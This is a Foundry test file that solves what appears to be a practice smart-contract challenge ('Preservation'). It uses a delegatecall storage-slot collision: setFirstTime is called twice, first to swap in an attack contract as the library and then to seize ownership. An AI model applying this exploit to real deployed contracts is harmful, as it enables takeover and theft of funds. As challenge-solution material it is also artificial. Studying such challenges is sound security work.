// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/16-Preservation.sol";
import "../contracts/16-PreservationFactory.sol";
import "../lib/forge-std/src/console2.sol";
import "../contracts/16-PreservationAttack.sol";

contract PreservationTest is Test {
    PreservationFactory public factoryContract;
    address public eoa;
    address public challengeAddress;

    function createUsers(uint256 userNum) internal returns (address[] memory) {
        address[] memory users = new address[](userNum);
        for (uint256 i = 0; i < userNum; i++) {
            // Compute the address from the given priv key
            address user = vm.addr(uint256(keccak256(abi.encodePacked(i))));

            // Fund user with 100 Eth
            vm.deal(user, 100);
            users[i] = user;
        }
        return users;
    }

    function setUp() public {
        // Create EOA and take the 0th (1st) element from the returned array
        eoa = createUsers(1)[0];

        // Deploy factory to create challenge instance
        factoryContract = new PreservationFactory();

        // Deploy challenge contract
        challengeAddress = factoryContract.createInstance(address(eoa));
    }

    function afterRun() public view returns (bool) {
        return factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
    }

    function testCheck() public {
        vm.startPrank(eoa, eoa);

        // Deploy attack contract
        PreservationAttack attackContract = new PreservationAttack();

        // Get challenge contract instance
        Preservation challenge = Preservation(challengeAddress);

        // Get attackContractAddress as uint. To explicitly convert to uint, first cast as uint160
        uint256 attackContractAddressUint = uint256(uint160(address(attackContract)));

        console2.log("attackContractAddress:", attackContractAddressUint);

        // Call setFirstTime() to set the address to the attack contract
        challenge.setFirstTime(attackContractAddressUint);

        // get timeZone1 variable of challenge contract to confirm it was set
        address timeZone1LibraryAddress = challenge.timeZone1Library();

        // Convert attackContractAddressUint back to address to confirm it was set
        address attackContractAddress = address(uint160(attackContractAddressUint));

        // Confirm timeZone1LibraryAddress is the same as attackContractAddress
        assertEq(timeZone1LibraryAddress, address(attackContractAddress), "owner should be attack contract");

        // Convert eoa address into uint so it can be set as the owner of the challenge contract
        uint256 eoaUint = uint256(uint160(address(eoa)));

        // Call timeZoneLibrary1 again to delegate call into the attack contract and set the owner of the challenge contract
        challenge.setFirstTime(eoaUint);

        console2.log("eao address", address(eoa));

        assertEq(factoryContract.validateInstance(payable(address(challengeAddress)), eoa), true, "Failed challenge");
    }
}
